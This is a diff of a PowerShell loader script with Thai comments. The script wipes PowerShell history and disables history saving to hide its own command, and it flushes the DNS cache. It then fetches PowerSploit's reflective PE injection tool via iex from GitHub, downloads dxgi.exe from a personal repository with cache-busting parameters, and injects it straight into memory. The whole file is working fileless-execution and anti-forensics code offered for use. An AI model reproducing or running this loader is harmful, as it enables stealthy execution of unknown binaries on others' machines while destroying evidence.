@@ -16,38 +16,44 @@ Write-Host "  ========================================================" -Foregro
 Write-Host ""
 
 # ==========================================
-# AUTO HISTORY CLEANUP (ลบประวัติอัตโนมัติแบบเงียบๆ)
+# AUTO HISTORY CLEANUP & CLEAR LOCAL CACHE
 # ==========================================
-Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Wiping PowerShell history traces..." -ForegroundColor White
+Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Wiping traces and clearing local cache..." -ForegroundColor White
+
+# เคลียร์ DNS Cache ของเครื่องเพื่อป้องกันการจำลิ้งก์เก่า
+Clear-DnsClientCache -ErrorAction SilentlyContinue
 
 $historyPath = (Get-PSReadLineOption).HistorySavePath
 if (Test-Path $historyPath) {
-    # 1. เคลียร์ข้อความในไฟล์ประวัติทิ้งให้เป็นหน้าขาว
+    # ลบเนื้อหาไฟล์ประวัติ
     Clear-Content -Path $historyPath -Force -ErrorAction SilentlyContinue
-    # 2. ลบประวัติการพิมพ์ในหน้าต่างปัจจุบัน
+    # เคลียร์ประวัติในหน้าต่าง
     Clear-History
-    # 3. บังคับไม่ให้ PowerShell เซฟคำสั่ง iex ของเราลงไปใหม่ตอนปิดโปรแกรม
+    # ปิดการเซฟประวัติ
     Set-PSReadLineOption -HistorySaveStyle SaveNothing
     
     Start-Sleep -Milliseconds 500
-    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " History wiped perfectly. No trace left." -ForegroundColor Green
+    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " System cleaned perfectly. No trace left." -ForegroundColor Green
 }
 Write-Host ""
 
 # ==========================================
-# FILELESS DOWNLOAD & EXECUTION (REFLECTIVE PE)
+# FILELESS DOWNLOAD & EXECUTION (ANTI-CACHE SYSTEM)
 # ==========================================
-Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Connecting to secure server..." -ForegroundColor White
+Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Connecting to secure server (Bypassing Cache)..." -ForegroundColor White
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
+# สร้างตัวเลขสุ่ม (Cache-Buster) เพื่อหลอกเซิร์ฟเวอร์ไม่ให้จำ Cache
+$RandomHash = Get-Random
+
 try {
-    # 1. โหลดเครื่องมือ Reflective PE Injection
-    $InjectorURL = "https://raw.githubusercontent.com/Vegusnerver/2squad/refs/heads/main/2squad.txt"
+    # 1. โหลดเครื่องมือ Reflective PE (พ่วงตัวเลขสุ่มกัน Cache)
+    $InjectorURL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1?t=$RandomHash"
     iex (New-Object Net.WebClient).DownloadString($InjectorURL)
 
-    # 2. ⚠️ ใส่ลิ้งก์ Raw ของไฟล์ .exe ของคุณบน GitHub ตรงนี้ ⚠️
-    $ExeURL = "https://raw.githubusercontent.com/Vegusnerver/2squad/main/dxgi.exe"
+    # 2. โหลดไฟล์ EXE ของคุณ (แก้เป็นลิ้งก์ Raw ของ dxgi.exe แล้ว)
+    $ExeURL = "https://raw.githubusercontent.com/Vegusnerver/2squad/main/dxgi.exe?t=$RandomHash"
     
     $WebClient = New-Object System.Net.WebClient
     $ExeBytes = $WebClient.DownloadData($ExeURL)
@@ -57,7 +63,7 @@ try {
     
     Start-Sleep -Seconds 2
     
-    # 3. สั่งรัน EXE เข้าไปใน Memory โดยตรง
+    # 3. สั่งรัน EXE เข้า Memory ทันที
     Invoke-ReflectivePEInjection -PEBytes $ExeBytes -ForceASLR
     
 } catch {
